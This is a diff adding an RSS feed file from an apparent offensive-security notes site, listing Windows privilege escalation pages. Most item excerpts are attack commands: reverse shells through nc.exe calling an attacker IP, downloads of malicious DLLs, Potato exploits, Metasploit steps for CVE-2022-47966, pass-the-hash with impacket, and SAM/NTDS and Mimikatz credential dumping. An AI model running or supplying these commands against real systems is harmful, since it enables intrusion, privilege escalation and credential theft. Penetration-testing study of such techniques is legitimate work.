@@ -1,0 +1,110 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Privilege Escalation on D0CUM3NTN4T10N</title>
+    <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/</link>
+    <description>Recent content in Privilege Escalation on D0CUM3NTN4T10N</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Wed, 17 Jan 2024 11:48:56 +0530</lastBuildDate>
+    <atom:link href="https://documentnation.github.io/docs/hdks/windows/privilege-escalation/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>UAC Windows Privilege Escalation</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/uac-windows-privilege-escalation/</link>
+      <pubDate>Wed, 06 Dec 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/uac-windows-privilege-escalation/</guid>
+      <description>Automation linkUACME is an automation tool for defeating Windows UAC.&#xA;Investigation link # Check the current user&amp;#39;s integrity level whoami /groups | findstr &amp;#34;Label&amp;#34; whoami /groups | find &amp;#34;Label&amp;#34; UAC Bypass linkAZMAN.MSC (Authorization Manager) link Open AZMAN.MSC by entering “azman.msc” in the Run. Click Help and select Help Topics. The MMC window will open. In the MMC window, right-click and select View Source. The Notepad opens. In the Notepad, select File → Open.</description>
+    </item>
+    <item>
+      <title>Windows PrivEsc with Registry Keys</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-registry-keys/</link>
+      <pubDate>Wed, 06 Dec 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-registry-keys/</guid>
+      <description>Investigation linkFind interesting registry or values in registry keys.&#xA;# HKLM: HKEY_LOCAL_MACHINE reg query HKLM reg query HKLM\SAM reg query HKLM\SAM\SAM reg query HKLM\SECURITY reg query HKLM\SOFTWARE reg query HKLM\SYSTEM # Find user credentials reg query “HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon” # HKU: HKEY_USERS reg query HKU reg query HKU\S-1-2-3 # HKCU: HKEY_CURRENT_USER reg query HKCU reg query HKCU\System Reveal Password from Registry Hives linkA hive is a logical group of keys, subkeys, and values in the registry that has a set of supporting files loaded into memory when the operating system is started or a user logs in.</description>
+    </item>
+    <item>
+      <title>Windows PrivEsc with SeBackupPrivilege</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-sebackupprivilege/</link>
+      <pubDate>Wed, 06 Dec 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-sebackupprivilege/</guid>
+      <description>Investigation linkFirst check if the current user has SeBackupPrivilege in the privilege information.&#xA;whoami /all If so, we can read arbitrary files on the system include administrator&amp;rsquo;s files, SAML file, SYSTEM registry file, etc.&#xA;Exploitation (Read Sensitive Files) link1. Download &amp;amp; Upload Malicious DLLs linkIn local machine, download malicious dlls from here&#xA;# If powershell, Invoke-WebRequest -Uri http://10.0.0.1:8000/SeBackupPrivilegeUtils.dll -OutFile .\SeBackupPrivilegeUtils.dll Invoke-WebRequest -Uri http://10.0.0.1:8000/SeBackupPrivilegeCmdLets.dll -OutFile .\SeBackupPrivilegeCmdLets.dll # If winrm, upload SeBackupPrivilegeUtils.dll upload SeBackupPrivilegeCmdLets.</description>
+    </item>
+    <item>
+      <title>Login Windows Shell</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/login-windows-shell/</link>
+      <pubDate>Sat, 11 Nov 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/login-windows-shell/</guid>
+      <description>Impacket PsExec linkPsExec gives us an interactive shell on the Windows host.&#xA;impacket-psexec username:password@&amp;lt;target-ip&amp;gt; # Pass the Hashes impacket-psexec -hashes abcdef0123456789abcdef0123456789:c2597747aa5e43022a3a3049a3c3b09d username@10.0.0.1 Impacket WmiExec linkWmiExec uses Windows Management Instrumentation (WMI) to give us an interactive shell on the Windows host.&#xA;impacket-wmiexec example.local/username@10.0.0.1 # Pass the Hashes impacket-wmiexec -hashes abcdef0123456789abcdef0123456789:c2597747aa5e43022a3a3049a3c3b09d example.local/username@10.0.0.1 </description>
+    </item>
+    <item>
+      <title>Windows PrivEsc with AD CS</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-adcs/</link>
+      <pubDate>Sat, 11 Nov 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-adcs/</guid>
+      <description>⚠️DISCLAIMER: I still don&amp;rsquo;t really understand AD CS, so it might be wrong. If so, please let me know via GitHub Issue or Pull Request.&#xA;Enumerate Certificate Templates linkCertificate templates are the rule set for AD CS. It contains CA name, CA permissions, etc. Some attributes are related to vulnerabilities to privilege escalation.&#xA;To enumerate them, we can use Certify or Certipy.&#xA;certipy find -u user@example.local -p password -dc-ip &amp;lt;target-ip&amp;gt; -stdout certipy find -vulnerable -u user@example.</description>
+    </item>
+    <item>
+      <title>Windows PrivEsc with RemotePotato</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-remotepotato/</link>
+      <pubDate>Sat, 11 Nov 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-remotepotato/</guid>
+      <description>Exploit linkReference: RemotePotato0&#xA;According to the RemotePotato0&amp;rsquo;s README, it abuses the DCOM activation service and trigger an NTLM authentication of any user currently logged on in the target machine. It is required that a privileged user is logged on the same machine (e.g. a Domain Admin user).&#xA;We can download the executable from https://github.com/antonioCoco/RemotePotato0.&#xA;Module 0 (-m 0: Rpc2Http cross protocol relay server + potato trigger) link # In attack machine sudo socat tcp-listen:135,fork,reuseaddr tcp:&amp;lt;target-ip&amp;gt;:9999 &amp;amp; sudo ntlmrelayx.</description>
+    </item>
+    <item>
+      <title>Windows PrivEsc with LocalPotato</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-localpotato/</link>
+      <pubDate>Thu, 26 Oct 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-localpotato/</guid>
+      <description>GodPotato linkRequired Privileges link SeImpersonatePrivilege Payloads link https://github.com/BeichenDream/GodPotato GodPotato -cmd &amp;#34;cmd /c whoami&amp;#34; JuicyPotato linkRequired Privilege link SeImpersonatePrivilege or SeAssignPrimaryToken Payloads link https://github.com/antonioCoco/JuicyPotatoNG https://github.com/ohpe/juicy-potato Before exploiting, we need to upload nc.exe (it is available from here) to the target machine.&#xA;Invoke-WebRequest -Uri http://10.0.0.1:8000/nc.exe -OutFile c:\Temp\nc.exe Next start a listener in local machine.&#xA;nc -lvnp 4444 Then execute JuicyPotato in target machine.&#xA;JuicyPotatoNG.exe -t * -p &amp;#34;c:\Temp\nc.exe&amp;#34; -a &amp;#34;10.0.0.1 4444 -e cmd.</description>
+    </item>
+    <item>
+      <title>Windows PrivEsc with Kerberos</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-kerberos/</link>
+      <pubDate>Sun, 22 Oct 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-kerberos/</guid>
+      <description>Privilege Escalation linkFirst off, download two PS scripts in local machine..&#xA;wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 wget https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1 Then upload them to the target machine.&#xA;# Evil-WinRM upload PowerView.ps1 Import-Module .\PowerView.ps1 upload Powermad.ps1 Import-Module .\Powermad.ps1 1. Check User&amp;rsquo;s Permission and Windows Versions linkCheck if users are allowed to create a new computer object on the domain.&#xA;Get-DomainObject -Identity &amp;#34;dc=example,dc=com&amp;#34; -Domain example.com # ------------------------- # Result ms-ds-machineaccountquota: 10 And check if the machine is at least Windows Server 2012.</description>
+    </item>
+    <item>
+      <title>ManageEngine ADSelfService Plus PrivEsc</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/manageengine-adselfservice-plus/</link>
+      <pubDate>Sun, 16 Apr 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/manageengine-adselfservice-plus/</guid>
+      <description>Directories link dir -Force \Program Files (x86)\ManageEngine\ADSelfService Plus\ Unauthenticated SAML RCE (CVE-2022-47966) linkReference: https://www.rapid7.com/db/modules/exploit/multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966/&#xA;msfconsole msf&amp;gt; use exploit/multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966 msf&amp;gt; set GUID 43ae36f51da65753530a64b37a510a53 msf&amp;gt; set ISSUER_URL http://example.com/adfs/services/trust msf&amp;gt; set RHOSTS &amp;lt;target-ip&amp;gt; msf&amp;gt; set RPORT 9251 msf&amp;gt; set LHOST &amp;lt;local-ip&amp;gt; msf&amp;gt; set LPORT 4444 msf&amp;gt; run meterpreter&amp;gt; shell </description>
+    </item>
+    <item>
+      <title>Outlook Reminder Privilege Escalation</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/outlook-reminder-privilege-escalation/</link>
+      <pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/outlook-reminder-privilege-escalation/</guid>
+      <description>Exploitation linkTo carry out this attack, the OutlookSpy is required. So please install it before proceeding.&#xA;1. Start Responder linkFirst off, start responder in our local machine to capture NetNTLM authentication.&#xA;# -I: Interface (eth0, tun0, etc.) responder -I tun0 2. Modify Reminder Settings using OutlookSpy link In Outlook, select Home tab and click New Items then choose Appointment in drawer menu.&#xA;In new Appointment window, select OutlookSpy tab then click CurrentItem.</description>
+    </item>
+    <item>
+      <title>Dumping Windows Password Hashes</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/dumping-windows-password-hashes/</link>
+      <pubDate>Wed, 08 Feb 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/dumping-windows-password-hashes/</guid>
+      <description>Commands linkUsing Credentials link impacket-secretsdump example.local/username:password@&amp;lt;target-ip&amp;gt; # -just-dc: Extract only NTDS.DIT (NTLM hashes and kerberos keys). impacket-secretsdump -just-dc example.local/username:password@&amp;lt;target-ip&amp;gt; # -just-dc-ntlm: Extract only NTDS.DIT data (NTLM hashes only). impacket-secretsdump -just-dc-ntlm example.local/username:password@&amp;lt;target-ip&amp;gt; Using NTDS file or Hives link # -ntds: NTDS.DIT file to parse # -system: SYSTEM hive to parse impacket-secretsdump -ntds ntds.dit -system system LOCAL # -sam: SAM hive to parse # -security: SECURITY hive to parse # -system: SYSTEM hive to parse impacket-secretsdump -sam sam.</description>
+    </item>
+    <item>
+      <title>Iperius Backup Service Privilege Escalation</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/iperius-backup-service-privilege-escalation/</link>
+      <pubDate>Wed, 08 Feb 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/iperius-backup-service-privilege-escalation/</guid>
+      <description>Investigation linkFirst check if Iperius is running in target machine.&#xA;wmic service list | findstr &amp;#34;Iperius&amp;#34; If the Iperius service is running, we can gain access to administrator privilege.&#xA;Exploitation link1. Create a Payload linkIn target machine, create a .bat file named &amp;ldquo;exploit.bat&amp;rdquo;.&#xA;@echo off C:\Users\&amp;lt;USERNAME&amp;gt;\Downloads\nc.exe &amp;lt;attack_machine_ip&amp;gt; 1337 -e exploit.exe Then place it to Desktop.&#xA;When saving, be sure to save it as the file type &amp;ldquo;All Files&amp;rdquo; (NOT .txt).</description>
+    </item>
+    <item>
+      <title>Windows PrivEsc with Unquoted Service Path</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-unquoted-service-path/</link>
+      <pubDate>Wed, 08 Feb 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-unquoted-service-path/</guid>
+      <description>Investigation linkIn target machine, find unquoted service path.&#xA;wmic service get name,displayname,pathname,startmode | findstr /i &amp;#34;Auto&amp;#34; | findstr /i /v &amp;#34;C:\\Windows\\&amp;#34; | findstr /i /v &amp;#34;&amp;#34;&amp;#34; &amp;#34; Also query the configuration information for a service.&#xA;sc qc &amp;#34;Development Service&amp;#34; For instance if the service path is &amp;ldquo;C:\Program Files\Development Files\Devservice Files\Service.exe&amp;rdquo;, we can place the exploit to &amp;ldquo;C:\Program Files\Devservice.exe&amp;rdquo; by ignoring paths after a space.&#xA;Exploitation link1. Create a Payload linkIn local machine, create a payload using msvenom.</description>
+    </item>
+    <item>
+      <title>Mimikatz</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/mimikatz/</link>
+      <pubDate>Sun, 20 Nov 2022 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/mimikatz/</guid>
+      <description>You can download it from the GitHub repository.&#xA;Usage link mimikatz Check if Mimikatz Running as an Administrator&#xA;mimikatz # privilege::debug Elevate to SYSTEM Level&#xA;mimikatz # token::elevate Dump Hashes&#xA;mimikatz # lsadump::lsa /patch Security Identifier of the Kerberos Ticket Granting Ticket Account&#xA;mimikatz # lsadump::lsa /inject /name:krbtgt All SAM Local Password Hashes&#xA;mimikatz # lsadump::sam Credentials from the LSASS Memory&#xA;mimikatz # sekurlsa::logonpasswords Create a Kerberos Golden Ticket&#xA;mimikatz # kerberos::golden /user:Administrator /domain:sample.</description>
+    </item>
+  </channel>
+</rss>
